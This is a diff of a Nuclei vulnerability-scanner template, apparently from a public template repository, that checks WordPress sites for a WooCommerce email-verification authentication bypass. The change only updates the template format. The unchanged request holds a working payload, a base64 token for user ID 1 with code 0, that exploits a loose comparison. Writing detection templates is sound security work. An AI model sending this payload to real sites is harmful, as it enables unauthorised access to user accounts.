@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wp-woocommerce-email-verification
 info:
   name: WooCommerce < 1.8.2 - Loose Comparison to Authentication Bypass
@@ -5,7 +6,7 @@ info:
   severity: critical
   reference: https://wpvulndb.com/vulnerabilities/10318
   tags: wordpress,wp-plugin,woocommerce
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0="
